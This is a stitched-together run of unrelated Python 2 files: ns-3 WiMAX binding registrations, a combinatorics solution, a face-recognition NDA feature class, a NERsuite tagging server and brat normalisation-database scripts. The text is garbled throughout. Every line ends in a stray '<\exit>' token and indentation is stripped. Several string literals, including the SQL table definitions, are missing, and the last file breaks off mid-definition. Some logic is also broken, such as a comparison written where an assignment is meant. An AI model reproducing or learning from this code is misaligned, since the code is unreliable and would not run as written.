cls.add_method('SetLostDlMapInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'lostDlMapInterval')])<\exit>
cls.add_method('GetLostDlMapInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetLostUlMapInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'lostUlMapInterval')])<\exit>
cls.add_method('GetLostUlMapInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetMaxDcdInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'maxDcdInterval')])<\exit>
cls.add_method('GetMaxDcdInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetMaxUcdInterval',<\exit>
'void',<\exit>
[param('ns3::Time', 'maxUcdInterval')])<\exit>
cls.add_method('GetMaxUcdInterval',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT1',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval1')])<\exit>
cls.add_method('GetIntervalT1',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT2',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval2')])<\exit>
cls.add_method('GetIntervalT2',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT3',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval3')])<\exit>
cls.add_method('GetIntervalT3',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT7',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval7')])<\exit>
cls.add_method('GetIntervalT7',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT12',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval12')])<\exit>
cls.add_method('GetIntervalT12',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT20',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval20')])<\exit>
cls.add_method('GetIntervalT20',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIntervalT21',<\exit>
'void',<\exit>
[param('ns3::Time', 'interval21')])<\exit>
cls.add_method('GetIntervalT21',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetMaxContentionRangingRetries',<\exit>
'void',<\exit>
[param('uint8_t', 'maxContentionRangingRetries')])<\exit>
cls.add_method('GetMaxContentionRangingRetries',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetBasicConnection',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection >', 'basicConnection')])<\exit>
cls.add_method('GetBasicConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetPrimaryConnection',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection >', 'primaryConnection')])<\exit>
cls.add_method('GetPrimaryConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetBasicCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPrimaryCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetModulationType',<\exit>
'void',<\exit>
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])<\exit>
cls.add_method('GetModulationType',<\exit>
'ns3::WimaxPhy::ModulationType',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetAreManagementConnectionsAllocated',<\exit>
'void',<\exit>
[param('bool', 'areManagementConnectionsAllocated')])<\exit>
cls.add_method('GetAreManagementConnectionsAllocated',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetAreServiceFlowsAllocated',<\exit>
'void',<\exit>
[param('bool', 'areServiceFlowsAllocated')])<\exit>
cls.add_method('GetAreServiceFlowsAllocated',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetScheduler',<\exit>
'ns3::Ptr< ns3::SSScheduler >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetScheduler',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::SSScheduler >', 'ssScheduler')])<\exit>
cls.add_method('HasServiceFlows',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Enqueue',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SendBurst',<\exit>
'void',<\exit>
[param('uint8_t', 'uiuc'), param('uint16_t', 'nrSymbols'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection'), param('ns3::MacHeaderType::HeaderType', 'packetType', default_value='::ns3::MacHeaderType::HEADER_TYPE_GENERIC')])<\exit>
cls.add_method('Start',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('Stop',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('AddServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow *', 'sf')])<\exit>
cls.add_method('AddServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow', 'sf')])<\exit>
cls.add_method('SetTimer',<\exit>
'void',<\exit>
[param('ns3::EventId', 'eventId'), param('ns3::EventId &', 'event')])<\exit>
cls.add_method('IsRegistered',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTimeToAllocation',<\exit>
'ns3::Time',<\exit>
[param('ns3::Time', 'defferTime')])<\exit>
cls.add_method('GetIpcsClassifier',<\exit>
'ns3::Ptr< ns3::IpcsClassifier >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetIpcsPacketClassifier',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::IpcsClassifier >', 'arg0')])<\exit>
cls.add_method('GetLinkManager',<\exit>
'ns3::Ptr< ns3::SSLinkManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetLinkManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::SSLinkManager >', 'arg0')])<\exit>
cls.add_method('GetServiceFlowManager',<\exit>
'ns3::Ptr< ns3::SsServiceFlowManager >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetServiceFlowManager',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::SsServiceFlowManager >', 'arg0')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoSend',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Mac48Address const &', 'source'), param('ns3::Mac48Address const &', 'dest'), param('uint16_t', 'protocolNumber')],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('DoReceive',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet')],<\exit>
visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_functions(root_module):<\exit>
module = root_module<\exit>
module.add_function('CRC8Calculate',<\exit>
'uint8_t',<\exit>
[param('uint8_t const *', 'data'), param('int', 'length')])<\exit>
register_functions_ns3_FatalImpl(module.get_submodule('FatalImpl'), root_module)<\exit>
register_functions_ns3_internal(module.get_submodule('internal'), root_module)<\exit>
return<\exit>
def register_functions_ns3_FatalImpl(module, root_module):<\exit>
return<\exit>
def register_functions_ns3_internal(module, root_module):<\exit>
return<\exit>
def main():<\exit>
out = FileCodeSink(sys.stdout)<\exit>
root_module = module_init()<\exit>
register_types(root_module)<\exit>
register_methods(root_module)<\exit>
register_functions(root_module)<\exit>
root_module.generate(out)<\exit>
if __name__ == '__main__':<\exit>
main()<\exit>
from pybindgen import Module, FileCodeSink, write_preamble, param, retval<\exit>
def register_types(module):<\exit>
module.add_class('MyClass')<\exit>
def register_methods(root_module):<\exit>
MyClass = root_module['MyClass']<\exit>
MyClass.add_constructor([], visibility='public')<\exit>
MyClass.add_constructor([param('double', 's'), param('double', 'l'), param('double', 'mean')], visibility='public')<\exit>
def register_functions(module):<\exit>
module.add_function('SomeFunction', 'int', [param('int', 'xpto')])<\exit>
MOD = 10 ** 9<\exit>
class Solution(object):<\exit>
def solve(self, n):<\exit>
result = []<\exit>
comb = 1<\exit>
result.append(comb)<\exit>
for i in xrange(1, n + 1):<\exit>
comb = comb * (n + 1 - i) / i<\exit>
result.append(comb % MOD)<\exit>
return " ".join(map(str, result))<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = int(f.readline().strip())<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
import numpy as np<\exit>
import math<\exit>
from sklearn.neighbors import NearestNeighbors as nn<\exit>
from facerec_py.facerec.feature import *<\exit>
from facerec_py.facerec.util import *<\exit>
class train():<\exit>
def __init__(self):<\exit>
self.mat = []<\exit>
self.labels = []<\exit>
self.dim = 0<\exit>
self.N = 0<\exit>
self.totalClass = 0<\exit>
class NDAFisher(AbstractFeature):<\exit>
def __init__(self, num_components=100):<\exit>
AbstractFeature.__init__(self)<\exit>
self._num_components = num_components<\exit>
def compute(self, X, y):<\exit>
nda = NDA()<\exit>
pca = PCA(self._num_components)<\exit>
model = ChainOperator(pca, nda)<\exit>
model.compute(X, y)<\exit>
self._eigenvectors = np.dot(pca.eigenvectors, nda.W.T)<\exit>
features = []<\exit>
for x in X:<\exit>
xp = self.project(x.reshape(-1, 1))<\exit>
features.append(xp)<\exit>
return features<\exit>
def extract(self, X):<\exit>
X = np.asarray(X).reshape(-1, 1)<\exit>
return self.project(X)<\exit>
def project(self, X):<\exit>
return np.dot(self._eigenvectors.T, X)<\exit>
class NDA(AbstractFeature):<\exit>
def __init__(self):<\exit>
AbstractFeature.__init__(self)<\exit>
def compute(self, X, y, K=1, useweights=0):<\exit>
self.train = train()<\exit>
self.train.mat = np.array(X)<\exit>
self.train.mat = asColumnMatrix(X)<\exit>
self.train.labels = y<\exit>
self.train.N = np.size(X, 0)<\exit>
self.train.dim = np.size(X, 1)<\exit>
self.train.totalClass = len(np.unique(y))<\exit>
self.K = K<\exit>
self.dim = np.size(X, 1)<\exit>
self.origdim = self.train.dim<\exit>
self.N = np.size(X, 0)<\exit>
self.totalClass = self.train.totalClass<\exit>
self.meandata = np.mean(self.train.mat, 1, dtype='float64')<\exit>
self.train.mat = self.train.mat - np.dot(self.meandata, np.ones((1, self.train.N)))<\exit>
self.indIn = np.zeros((K, self.N))<\exit>
self.indEx = np.zeros((K, self.N))<\exit>
self.valIn = np.zeros((K, self.N))<\exit>
self.valEx = np.zeros((K, self.N))<\exit>
self.compute_within_class_matrix_whitening()<\exit>
self.mnnInn = self.compute_within_class_scatter_matrix()<\exit>
self.diffIntra = self.train.mat - self.mnnInn<\exit>
self.Wscat = np.dot(self.diffIntra, self.diffIntra.transpose())/self.diffIntra.shape[1]<\exit>
self.eval, self.evec = np.linalg.eig(self.Wscat)<\exit>
self.ind = np.argsort(self.eval, 0)<\exit>
self.eval = self.eval[self.ind]<\exit>
self.eval = np.flipud(self.eval)<\exit>
self.ind = np.flipud(self.ind)<\exit>
self.evec = self.evec[:, self.ind]<\exit>
self.wdim = np.max(np.nonzero(self.eval > math.pow(10, -8))).real<\exit>
self.evec = self.evec[:, 0:self.wdim]<\exit>
self.whiteMat = np.dot(np.diag(1/np.sqrt(self.eval[0:self.wdim])), self.evec.transpose())<\exit>
self.Wtr = np.dot(self.whiteMat, self.train.mat)<\exit>
self.compute_bet_class_cluster_dist()<\exit>
self.mnnEx = self.compute_bet_class_cluster_matrix()<\exit>
self.diffExtra = self.Wtr - self.mnnEx<\exit>
if useweights:<\exit>
self.weights = np.minimum(self.valIn[self.K-1, :], self.valEx[self.K-1, :])<\exit>
temp = np.ones((self.Wtr.shape[1],))<\exit>
temp = np.dot(temp, self.weights)<\exit>
temp = temp * self.diffExtra<\exit>
self.bscat = np.dot(temp, np.transpose(self.diffExtra)) / self.N<\exit>
else:<\exit>
self.bscat = np.dot(self.diffExtra, self.diffExtra.conj().transpose())/self.N<\exit>
self.eigval, self.evec = np.linalg.eig(self.bscat)<\exit>
self.ind = np.argsort(self.eigval)<\exit>
self.val = self.eigval[self.ind]<\exit>
self.ind = np.flipud(self.ind)<\exit>
self.eigval = self.eigval[self.ind]<\exit>
self.eigvec = self.evec[:, self.ind[0:min(self.dim, self.wdim)]]<\exit>
self.mat = np.dot(self.eigvec.conj().transpose(), self.Wtr)<\exit>
self.W = np.dot(self.eigvec.conj().transpose(), self.whiteMat)<\exit>
self.proymat = self.W<\exit>
features = []<\exit>
for x in X:<\exit>
xp = self.project(x.reshape(-1, 1))<\exit>
features.append(xp)<\exit>
return features<\exit>
def compute_bet_class_cluster_dist(self):<\exit>
for x in np.unique(self.train.labels):<\exit>
who_cl = np.where(self.train.labels == x)[0]<\exit>
who_notcl = np.where((self.train.labels != x))[0]<\exit>
self.data_intra = self.Wtr[:, who_cl]<\exit>
self.data_extra = self.Wtr[:, who_notcl]<\exit>
knn = nn().fit(self.data_extra.transpose())<\exit>
self.dextra, self.indextra = knn.kneighbors(self.data_intra.transpose())<\exit>
self.dextra = self.dextra.transpose()<\exit>
self.indextra = self.indextra.transpose()<\exit>
self.indEx[:, who_cl] = who_notcl[self.indextra[1, :]]<\exit>
self.valEx[:, who_cl] = self.dextra[1, :]<\exit>
def compute_bet_class_cluster_matrix(self):<\exit>
if self.K == 1:<\exit>
mnnEx = self.Wtr[:, map(lambda x: int(x), self.indEx[0, :])]<\exit>
else:<\exit>
mnnEx = np.zeros((np.size(self.Wtr, 0), self.train.N))<\exit>
for n in range(0, self.train.N):<\exit>
mnnEx[:, n] == np.mean(self.Wtr[:, map(lambda x: int(x), self.indEx[:, n])], 1)<\exit>
return mnnEx<\exit>
def compute_within_class_matrix_whitening(self):<\exit>
for x in np.unique(self.train.labels):<\exit>
who_cl = np.where(self.train.labels == x)[0]<\exit>
self.data_intra = self.train.mat[:, who_cl]<\exit>
knn = nn().fit(self.data_intra.transpose())<\exit>
self.dintra, self.indintra = knn.kneighbors(self.data_intra.transpose())<\exit>
self.dintra = self.dintra.transpose()<\exit>
self.indintra = self.indintra.transpose()<\exit>
self.dintra[self.K, :] = []<\exit>
self.indintra[self.K, :] = []<\exit>
self.valIn[:, who_cl] = self.dintra[1, :]<\exit>
self.indIn[:, who_cl] = who_cl[self.indintra[1, :]]<\exit>
def compute_within_class_scatter_matrix(self):<\exit>
if self.K == 1:<\exit>
mnnInn = self.train.mat[:, map(lambda x: int(x), self.indIn[0])]<\exit>
else:<\exit>
mnnInn = np.zeros((self.train.dim, self.train.N))<\exit>
for n in range(0, self.train.N):<\exit>
mean = np.mean(self.train.mat[:, map(lambda x: int(x), self.indIn[:, n])], 1)<\exit>
for x in range(0, self.train.dim):<\exit>
mnnInn[x, n] = mean[x]<\exit>
return mnnInn<\exit>
def extract(self, X):<\exit>
X = np.asarray(X).reshape(-1, 1)<\exit>
return self.project(X)<\exit>
def project(self, X):<\exit>
return np.dot(self.W, X)<\exit>
def __repr__(self):<\exit>
return "NDA"<\exit>
from argparse import ArgumentParser<\exit>
from os.path import join as path_join<\exit>
from os.path import dirname<\exit>
try:<\exit>
from json import dumps<\exit>
except ImportError:<\exit>
from sys import path as sys_path<\exit>
sys_path.append(path_join(dirname(__file__), '../server/lib/ujson'))<\exit>
from ujson import dumps<\exit>
from subprocess import PIPE, Popen<\exit>
from random import choice, randint<\exit>
from sys import stderr<\exit>
from urlparse import urlparse<\exit>
try:<\exit>
from urlparse import parse_qs<\exit>
except ImportError:<\exit>
from cgi import parse_qs<\exit>
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler<\exit>
import re<\exit>
from sentencesplit import sentencebreaks_to_newlines<\exit>
from BIOtoStandoff import BIO_lines_to_standoff<\exit>
DOCUMENT_BOUNDARY = 'END-DOCUMENT'<\exit>
NERSUITE_SCRIPT   = path_join(dirname(__file__), './nersuite_tag.sh')<\exit>
NERSUITE_COMMAND  = [NERSUITE_SCRIPT, '-multidoc', DOCUMENT_BOUNDARY]<\exit>
ARGPARSER = ArgumentParser(description='An example HTTP tagging service using NERsuite')<\exit>
ARGPARSER.add_argument('-p', '--port', type=int, default=47111,<\exit>
help='port to run the HTTP service on (default: 47111)')<\exit>
tagger_process = None<\exit>
def run_tagger(cmd):<\exit>
global tagger_process<\exit>
try:<\exit>
tagger_process = Popen(cmd, stdin=PIPE, stdout=PIPE, bufsize=1)<\exit>
except Exception, e:<\exit>
print >> stderr, "Error running '%s':" % cmd, e<\exit>
raise<\exit>
def _apply_tagger(text):<\exit>
global tagger_process, tagger_queue<\exit>
try:<\exit>
splittext = sentencebreaks_to_newlines(text)<\exit>
except:<\exit>
print >> stderr, "Warning: sentence splitting failed for input:\n'%s'" % text<\exit>
splittext = text<\exit>
print >> tagger_process.stdin, splittext<\exit>
print >> tagger_process.stdin, DOCUMENT_BOUNDARY<\exit>
tagger_process.stdin.flush()<\exit>
response_lines = []<\exit>
while True:<\exit>
l = tagger_process.stdout.readline()<\exit>
l = l.rstrip('\n')<\exit>
if l == DOCUMENT_BOUNDARY:<\exit>
break<\exit>
response_lines.append(l)<\exit>
try:<\exit>
tagged_entities = BIO_lines_to_standoff(response_lines, text)<\exit>
except:<\exit>
print >> stderr, "Warning: BIO-to-standoff conversion failed for BIO:\n'%s'" % '\n'.join(response_lines)<\exit>
return {}<\exit>
anns = {}<\exit>
for t in tagged_entities:<\exit>
anns["T%d" % t.idNum] = {<\exit>
'type': t.eType,<\exit>
'offsets': ((t.startOff, t.endOff), ),<\exit>
'texts': (t.eText, ),<\exit>
}<\exit>
return anns<\exit>
class NERsuiteTaggerHandler(BaseHTTPRequestHandler):<\exit>
def do_GET(self):<\exit>
query = parse_qs(urlparse(self.path).query)<\exit>
try:<\exit>
json_dic = _apply_tagger(query['text'][0])<\exit>
except KeyError:<\exit>
json_dic = {}<\exit>
self.send_response(200)<\exit>
self.send_header('Content-type', 'application/json; charset=utf-8')<\exit>
self.end_headers()<\exit>
self.wfile.write(dumps(json_dic))<\exit>
print >> stderr, ('Generated %d annotations' % len(json_dic))<\exit>
def log_message(self, format, *args):<\exit>
return<\exit>
def main(args):<\exit>
argp = ARGPARSER.parse_args(args[1:])<\exit>
print >> stderr, 'Starting NERsuite ...'<\exit>
run_tagger(NERSUITE_COMMAND)<\exit>
server_class = HTTPServer<\exit>
httpd = server_class(('localhost', argp.port), NERsuiteTaggerHandler)<\exit>
print >> stderr, 'NERsuite tagger service started'<\exit>
try:<\exit>
httpd.serve_forever()<\exit>
except KeyboardInterrupt:<\exit>
pass<\exit>
httpd.server_close()<\exit>
print >> stderr, 'NERsuite tagger service stopped'<\exit>
if __name__ == '__main__':<\exit>
from sys import argv<\exit>
exit(main(argv))<\exit>
import numpy as np<\exit>
def minmax(X, low, high, minX=None, maxX=None, dtype=np.float):<\exit>
X = np.asarray(X)<\exit>
if minX is None:<\exit>
minX = np.min(X)<\exit>
if maxX is None:<\exit>
maxX = np.max(X)<\exit>
X -= float(minX)<\exit>
X /= float((maxX - minX))<\exit>
X = X * (high - low)<\exit>
X = X + low<\exit>
return np.asarray(X, dtype=dtype)<\exit>
def zscore(X, mean=None, std=None):<\exit>
X = np.asarray(X)<\exit>
if mean is None:<\exit>
mean = X.mean()<\exit>
if std is None:<\exit>
std = X.std()<\exit>
X = (X - mean) / std<\exit>
return X<\exit>
def gaussian(X, mu, sig):<\exit>
return (1/(sig*np.sqrt(2*np.pi)))*\<\exit>
np.exp(-(X-mu)**2/(2*sig**2))<\exit>
def inverse_dissim(X):<\exit>
X = np.asarray(X)<\exit>
X = zscore(X)<\exit>
X = minmax(X, 0, 10)<\exit>
return 1./(1+X)<\exit>
def vector_normalize(x):<\exit>
return x / np.linalg.norm(x)<\exit>
def gaussian_kernel(X, mu=None, sig=None):<\exit>
X = np.asarray(X)<\exit>
if mu is None:<\exit>
mu = X.mean()<\exit>
if sig is None:<\exit>
sig = X.std()<\exit>
return np.exp(-np.power(X-mu, 2)/(2*sig**2))<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import codecs<\exit>
from datetime import datetime<\exit>
from os.path import dirname, basename, splitext, join<\exit>
import sqlite3 as sqlite<\exit>
try:<\exit>
import simstring<\exit>
except ImportError:<\exit>
errorstr =<\exit>
print >> sys.stderr, errorstr<\exit>
sys.exit(1)<\exit>
DEFAULT_INPUT_ENCODING = 'UTF-8'<\exit>
NORM_DB_STRING = 'NORM_DB_VERSION'<\exit>
NORM_DB_VERSION = '1.0.1'<\exit>
SQL_DB_FILENAME_EXTENSION = 'db'<\exit>
SS_DB_FILENAME_EXTENSION = 'ss.db'<\exit>
DEFAULT_NGRAM_LENGTH = 3<\exit>
DEFAULT_INCLUDE_MARKS = False<\exit>
MAX_ERROR_LINES = 100<\exit>
TYPE_VALUES = ["name", "attr", "info"]<\exit>
TABLE_FOR_TYPE = {<\exit>
"name" : "names",<\exit>
"attr" : "attributes",<\exit>
"info" : "infos",<\exit>
}<\exit>
TABLE_HAS_NORMVALUE = {<\exit>
"names" : True,<\exit>
"attributes" : True,<\exit>
"infos" : False,<\exit>
}<\exit>
assert set(TYPE_VALUES) == set(TABLE_FOR_TYPE.keys())<\exit>
assert set(TABLE_FOR_TYPE.values()) == set(TABLE_HAS_NORMVALUE.keys())<\exit>
CREATE_TABLE_COMMANDS = [<\exit>
,<\exit>
,<\exit>
,<\exit>
,<\exit>
,<\exit>
]<\exit>
CREATE_INDEX_COMMANDS = [<\exit>
"CREATE INDEX entities_uid ON entities (uid);",<\exit>
"CREATE INDEX names_value ON names (value);",<\exit>
"CREATE INDEX names_normvalue ON names (normvalue);",<\exit>
"CREATE INDEX names_entity_id ON names (entity_id);",<\exit>
"CREATE INDEX attributes_value ON attributes (value);",<\exit>
"CREATE INDEX attributes_normvalue ON attributes (normvalue);",<\exit>
"CREATE INDEX attributes_entity_id ON attributes (entity_id);",<\exit>
"CREATE INDEX infos_entity_id ON infos (entity_id);",<\exit>
]<\exit>
SELECT_SIMSTRING_STRINGS_COMMAND =<\exit>
def string_norm_form(s):<\exit>
return s.lower().strip().replace('-', ' ')<\exit>
def default_db_dir():<\exit>
sys.path.append(join(dirname(__file__), '..'))<\exit>
try:<\exit>
from config import WORK_DIR<\exit>
return WORK_DIR<\exit>
except ImportError:<\exit>
print >> sys.stderr, "Warning: failed to determine brat work directory, using current instead."<\exit>
return "."<\exit>
def argparser():<\exit>
import argparse<\exit>
ap=argparse.ArgumentParser(description="Create normalization DBs for given file")<\exit>
ap.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose output")<\exit>
ap.add_argument("-d", "--database", default=None, help="Base name of databases to create (default by input file name in brat work directory)")<\exit>
ap.add_argument("-e", "--encoding", default=DEFAULT_INPUT_ENCODING, help="Input text encoding (default "+DEFAULT_INPUT_ENCODING+")")<\exit>
ap.add_argument("file", metavar="FILE", help="Normalization data")<\exit>
return ap<\exit>
def sqldb_filename(dbname):<\exit>
return join(default_db_dir(), dbname+'.'+SQL_DB_FILENAME_EXTENSION)<\exit>
def ssdb_filename(dbname):<\exit>
return join(default_db_dir(), dbname+'.'+SS_DB_FILENAME_EXTENSION)<\exit>
def main(argv):<\exit>
arg = argparser().parse_args(argv[1:])<\exit>
assert DEFAULT_NGRAM_LENGTH == 3, "Error: unsupported n-gram length"<\exit>
assert DEFAULT_INCLUDE_MARKS == False, "Error: begin/end marks not supported"<\exit>
infn = arg.file<\exit>
if arg.database is None:<\exit>
bn = splitext(basename(infn))[0]<\exit>
sqldbfn = sqldb_filename(bn)<\exit>
ssdbfn = ssdb_filename(bn)<\exit>
else:<\exit>
sqldbfn = arg.database+'.'+SQL_DB_FILENAME_EXTENSION<\exit>
ssdbfn = arg.database+'.'+SS_DB_FILENAME_EXTENSION<\exit>
if arg.verbose:<\exit>
print >> sys.stderr, "Storing SQL DB as %s and" % sqldbfn<\exit>
print >> sys.stderr, "  simstring DB as %s" % ssdbfn<\exit>
start_time = datetime.now()<\exit>
import_count, duplicate_count, error_count, simstring_count = 0, 0, 0, 0<\exit>
with codecs.open(infn, 'rU', encoding=arg.encoding) as inf:<\exit>
try:<\exit>
connection = sqlite.connect(sqldbfn)<\exit>
except sqlite.OperationalError, e:<\exit>
print >> sys.stderr, "Error connecting to DB %s:" % sqldbfn, e<\exit>
return 1<\exit>
cursor = connection.cursor()<\exit>
if arg.verbose:<\exit>
print >> sys.stderr, "Creating tables ...",<\exit>
for command in CREATE_TABLE_COMMANDS:<\exit>
try:<\exit>
cursor.execute(command)<\exit>
except sqlite.OperationalError, e:<\exit>
print >> sys.stderr, "Error creating %s:" % sqldbfn, e, "(DB exists?)"<\exit>
return 1<\exit>
if arg.verbose:<\exit>
print >> sys.stderr, "done."<\exit>
print >> sys.stderr, "Importing data ...",<\exit>
next_eid = 1<\exit>
label_id = {}<\exit>
next_lid = 1<\exit>
next_pid = dict([(t,1) for t in TYPE_VALUES])<\exit>
for i, l in enumerate(inf):<\exit>
l = l.rstrip('\n')<\exit>
try:<\exit>
id_, rest = l.split('\t', 1)<\exit>
except ValueError:<\exit>
if error_count < MAX_ERROR_LINES:<\exit>
print >> sys.stderr, "Error: skipping line %d: expected tab-separated fields, got '%s'" % (i+1, l)<\exit>
elif error_count == MAX_ERROR_LINES:<\exit>
print >> sys.stderr, "(Too many errors; suppressing further error messages)"<\exit>
error_count += 1<\exit>
continue<\exit>
try:<\exit>
triples = []<\exit>
for triple in rest.split('\t'):<\exit>
type_, label, string = triple.split(':', 2)<\exit>
if type_ not in TYPE_VALUES:<\exit>
print >> sys.stderr, "Unknown TYPE %s" % type_<\exit>
triples.append((type_, label, string))<\exit>
except ValueError:<\exit>
if error_count < MAX_ERROR_LINES:<\exit>
print >> sys.stderr, "Error: skipping line %d: expected tab-separated TYPE:LABEL:STRING triples, got '%s'" % (i+1, rest)<\exit>
elif error_count == MAX_ERROR_LINES:<\exit>
print >> sys.stderr, "(Too many errors; suppressing further error messages)"<\exit>
error_count += 1<\exit>
continue<\exit>
eid = next_eid<\exit>
next_eid += 1<\exit>
try:<\exit>
cursor.execute("INSERT into entities VALUES (?, ?)", (eid, id_))<\exit>
except sqlite.IntegrityError, e:<\exit>
if error_count < MAX_ERROR_LINES:<\exit>
print >> sys.stderr, "Error inserting %s (skipping): %s" % (id_, e)<\exit>
elif error_count == MAX_ERROR_LINES:<\exit>
print >> sys.stderr, "(Too many errors; suppressing further error messages)"<\exit>
error_count += 1<\exit>
continue<\exit>
labels = set([l for t,l,s in triples])<\exit>
new_labels = [l for l in labels if l not in label_id]<\exit>
for label in new_labels:<\exit>
lid = next_lid<\exit>
next_lid += 1<\exit>
cursor.execute("INSERT into labels VALUES (?, ?)", (lid, label))<\exit>
label_id[label] = lid<\exit>
for type_, label, string in triples:<\exit>
table = TABLE_FOR_TYPE[type_]<\exit>
pid = next_pid[type_]<\exit>
next_pid[type_] += 1<\exit>
lid = label_id[label]<\exit>
if TABLE_HAS_NORMVALUE[table]:<\exit>
normstring = string_norm_form(string)<\exit>
cursor.execute("INSERT into %s VALUES (?, ?, ?, ?, ?)" % table,<\exit>
(pid, eid, lid, string, normstring))<\exit>
else:<\exit>
cursor.execute("INSERT into %s VALUES (?, ?, ?, ?)" % table,<\exit>
(pid, eid, lid, string))<\exit>
import_count += 1<\exit>
if arg.verbose and (i+1)%10000 == 0:<\exit>
print >> sys.stderr, '.',<\exit>
if arg.verbose:<\exit>
print >> sys.stderr, "done."<\exit>
if arg.verbose:<\exit>
print >> sys.stderr, "Creating indices ...",<\exit>
for command in CREATE_INDEX_COMMANDS:<\exit>
try:<\exit>
cursor.execute(command)<\exit>
except sqlite.OperationalError, e:<\exit>
print >> sys.stderr, "Error creating index", e<\exit>
return 1<\exit>
if arg.verbose:<\exit>
print >> sys.stderr, "done."<\exit>
connection.commit()<\exit>
if arg.verbose:<\exit>
print >> sys.stderr, "Creating simstring DB ...",<\exit>
try:<\exit>
ssdb = simstring.writer(ssdbfn)<\exit>
for row in cursor.execute(SELECT_SIMSTRING_STRINGS_COMMAND):<\exit>
s = row[0].encode('utf-8')<\exit>
ssdb.insert(s)<\exit>
simstring_count += 1<\exit>
ssdb.close()<\exit>
except:<\exit>
print >> sys.stderr, "Error building simstring DB"<\exit>
raise<\exit>
if arg.verbose:<\exit>
print >> sys.stderr, "done."<\exit>
cursor.close()<\exit>
delta = datetime.now() - start_time<\exit>
if arg.verbose:<\exit>
print >> sys.stderr<\exit>
print >> sys.stderr, "Done in:", str(delta.seconds)+"."+str(delta.microseconds/10000), "seconds"<\exit>
print "Done, imported %d entries (%d strings), skipped %d duplicate keys, skipped %d invalid lines" % (import_count, simstring_count, duplicate_count, error_count)<\exit>
return 0<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
import sys<\exit>
import os.path<\exit>
import sqlite3 as sqlite<\exit>
TYPE_TABLES = ["names", "attributes", "infos"]<\exit>
NON_EMPTY_TABLES = set(["names"])<\exit>
def argparser():<\exit>
import argparse<\exit>
